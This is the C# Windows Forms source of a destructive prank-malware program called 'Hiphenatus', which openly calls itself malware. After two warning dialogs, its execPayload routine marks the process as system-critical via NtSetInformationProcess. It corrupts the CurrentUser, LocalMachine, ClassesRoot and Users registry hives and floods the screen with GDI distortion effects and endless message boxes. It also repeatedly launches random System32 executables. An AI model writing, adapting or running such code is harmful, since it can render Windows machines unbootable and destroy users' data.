using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static Hiphenatus.Bytebeats;
using static Hiphenatus.Virus;
using static Hiphenatus.WinApi.APIs;

namespace Hiphenatus
{
    public partial class Form1 : Form
    {
        int IS_THIS_BUILD_DESTRUCTIVE = 1;

        [DllImport("gdi32.dll")]
        private static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

        [DllImport("gdi32.dll")]
        private static extern int SelectClipRgn(IntPtr hdc, IntPtr hrgn);


        public Form1()
        {
            InitializeComponent();
        }

        private void label1_Click(object sender, EventArgs e)
        {
            // Corrected MessageBox usage to use System.Windows.Forms.MessageBox  
            System.Windows.Forms.MessageBox.Show("yeah that true");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            if (trackBar1.Value == 7)
            {
                // Corrected MessageBox usage to use System.Windows.Forms.MessageBox  
                // First  
                if (System.Windows.Forms.MessageBox.Show("Hi! This is MALWARE. " + Environment.NewLine + "Are you sure you want to continue?", "_-Hiphenatus-_ - Last Chance: DESTRUCTIVE? " + IS_THIS_BUILD_DESTRUCTIVE, MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.OK)
                {
                    // Second  
                    if (System.Windows.Forms.MessageBox.Show("Last chance, click OK to cancel the malware and save your computer. This is not a joke, click fucking [[CANCEL]] to save yo shit ass pc.", "_-Hiphenatus-_ - Last Chance: DESTRUCTIVE? " + IS_THIS_BUILD_DESTRUCTIVE, MessageBoxButtons.OKCancel, MessageBoxIcon.Error) == DialogResult.OK)
                    {
                        execPayload();
                    }
                    else
                    {
                        Environment.Exit(0); // QUIT  
                    }
                }
                else
                {
                    Environment.Exit(0); // QUIT  
                }
            }
        }

        public static string randomUni(int length)
        {
            Random random = new Random();
            StringBuilder builder = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                builder.Append((char)random.Next(0x0000, 0x10FFFF));
            }
            return builder.ToString();
        }

        public static void MSGLOL()
        {
            while (true)
            {
                System.Windows.Forms.MessageBox.Show(randomUni(20));
            }
        }

        public static void Shader1()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            while (true)
            {
                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                Parallel.For(8, size, i =>
                {
                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] - 1);
                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] - 1);
                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] - 1);

                });
                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                BitBlt(hdc, random.Next(-5, 5), random.Next(-5, 5), x, y, mdc, 0, 0, SRCPAINT);

                Thread.Sleep(1);
            }

            SelectObject(mdc, oldObject);
            ReleaseDC(IntPtr.Zero, hdc);
            DeleteObject(bitmap);
            DeleteDC(hdc);
            DeleteDC(mdc);
        }

        public static void Shader2()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            while (true)
            {
                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                Parallel.For(8, size, i =>
                {
                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 0]);
                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1]);
                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 2]);

                });
                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                Thread.Sleep(1);
            }

            SelectObject(mdc, oldObject);
            ReleaseDC(IntPtr.Zero, hdc);
            DeleteObject(bitmap);
            DeleteDC(hdc);
            DeleteDC(mdc);
        }

        public static void Shader3()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            while (true)
            {
                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                Parallel.For(8, size, i =>
                {
                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 2 + 2]);
                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 2 + 1]);
                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 2 + 2]);

                });
                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                Thread.Sleep(1);
            }

            SelectObject(mdc, oldObject);
            ReleaseDC(IntPtr.Zero, hdc);
            DeleteObject(bitmap);
            DeleteDC(hdc);
            DeleteDC(mdc);
        }

        public static void Shader4()
        {
            int x = GetSystemMetrics(SM_CXSCREEN);
            int y = GetSystemMetrics(SM_CYSCREEN);
            int size = x * y;

            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr mdc = CreateCompatibleDC(hdc);

            BITMAPINFO bmi = new BITMAPINFO
            {
                bmiHeader = new BITMAPINFOHEADER
                {
                    biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER)),
                    biWidth = x,
                    biHeight = -y,
                    biPlanes = 1,
                    biBitCount = 24,
                    biCompression = 0
                },
                bmiColors = new RGBQUAD[256]
            };

            IntPtr bitmap = CreateDIBSection(hdc, ref bmi, 0, out IntPtr ppvBits, IntPtr.Zero, 0);
            IntPtr oldObject = SelectObject(mdc, bitmap);

            byte[] rgbArray = new byte[size * 3]; // Each RGBTRIPLE has 3 bytes

            Random random = new Random();
            while (true)
            {
                BitBlt(mdc, 0, 0, x, y, hdc, 0, 0, SRCCOPY);
                Marshal.Copy(ppvBits, rgbArray, 0, rgbArray.Length);

                Parallel.For(8, size, i =>
                {
                    rgbArray[i * 3 + 2] = (byte)(rgbArray[i * 3 + 2] * rgbArray[i * 3 + 1]);
                    rgbArray[i * 3 + 1] = (byte)(rgbArray[i * 3 + 1] * rgbArray[i * 3 + 0]);
                    rgbArray[i * 3 + 0] = (byte)(rgbArray[i * 3 + 0] * rgbArray[i * 3 + 2]);

                });
                Marshal.Copy(rgbArray, 0, ppvBits, rgbArray.Length);
                BitBlt(hdc, 0, 0, x, y, mdc, 0, 0, SRCCOPY);

                Thread.Sleep(1);
            }

            SelectObject(mdc, oldObject);
            ReleaseDC(IntPtr.Zero, hdc);
            DeleteObject(bitmap);
            DeleteDC(hdc);
            DeleteDC(mdc);
        }
        public void ci(int x, int y, int w, int h)
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            IntPtr hrgn = CreateEllipticRgn(x, y, x + w, y + h);
            SelectClipRgn(hdc, hrgn);
            BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
            DeleteObject(hrgn);
            ReleaseDC(IntPtr.Zero, hdc);
        }

        public void MoveCircle()
        {
            int x = 100, y = 100; // Initial position
            int dx = 15, dy = 15;  // Velocity (change in position)
            int width = 50, height = 50; // Circle dimensions
            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;

            while (true)
            {
                // Update position
                x += dx;
                y += dy;

                // Check for collisions with screen boundaries
                if (x <= 0 || x + width >= screenWidth)
                    dx = -dx; // Reverse horizontal direction
                if (y <= 0 || y + height >= screenHeight)
                    dy = -dy; // Reverse vertical direction

                // Draw the circle at the new position
                ci(x, y, width, height);
                Thread.Sleep(1);
            }
        }
        public static void DefineAsCritical()
        {
            int isCritical = 1;
            Process.EnterDebugMode();
            IntPtr handle = Process.GetCurrentProcess().Handle;
            NtSetInformationProcess(handle, 0x1D, ref isCritical, sizeof(int));
        }
        public static void randEXE()
        {
            // Open a random exe file from system32
            string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.System), "*.exe");
            Random random = new Random();
            for (int i = 0; i < 3; i++)
            {
                try
                {
                    Process.Start(files[random.Next(files.Length)]);
                }
                catch (Exception){}
            }
        }

        public static void randEXELOOP(int ms)
        {
            while (true)
            {
                randEXE();
                Thread.Sleep(ms);
            }
        }
        public void execPayload()
        {
            DefineAsCritical();
            Corrupt(Registry.CurrentUser);

            Process.Start("https://www.youtube.com/@sudoUltimateQuack");

            Thread XDD = new Thread(MSGLOL); XDD.Start();
            Thread shader1Thread = new Thread(Shader1); shader1Thread.Start();
            Thread shader2Thread = new Thread(Shader2); shader2Thread.Start();
            Thread circle = new Thread(MoveCircle); circle.Start();
            Thread bytebeat1 = new Thread(Beat5); bytebeat1.Start();

#if DEBUG
            Console.WriteLine("Phase 1 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            Corrupt(Registry.LocalMachine);

            Process.Start("https://www.youtube.com/@sudoUltimateQuack");

            XDD.Abort();
            shader1Thread.Abort();
            shader2Thread.Abort();
            circle.Abort();
            bytebeat1.Abort();

            Thread shader3Thread = new Thread(Shader3); shader3Thread.Start();
            Thread bytebeat2 = new Thread(Beat9); bytebeat2.Start();
            Thread exexe = new Thread(() => randEXELOOP(4000));
#if DEBUG
            Console.WriteLine("Phase 2 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            Corrupt(Registry.ClassesRoot);

            shader3Thread.Abort();
            bytebeat2.Abort();

            Thread shader4Thread = new Thread(Shader4); shader4Thread.Start();
            Thread bytebeat3 = new Thread(Beat8); bytebeat3.Start();

#if DEBUG
            Console.WriteLine("Phase 3 - Start");
#endif

            Thread.Sleep(8000);

            ClearScreen();

            Corrupt(Registry.Users);

            shader4Thread.Abort();
            bytebeat3.Abort();
            exexe.Abort();
        }



        private void Form1_Load(object sender, EventArgs e)
        {
#if DEBUG
            Console.WriteLine("Form1 loaded!");
#endif
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void trackBar1_Scroll(object sender, EventArgs e)
        {
#if DEBUG
            Console.WriteLine("DEATHtrackBar: " + trackBar1.Value.ToString());
#endif
        }
    }
}
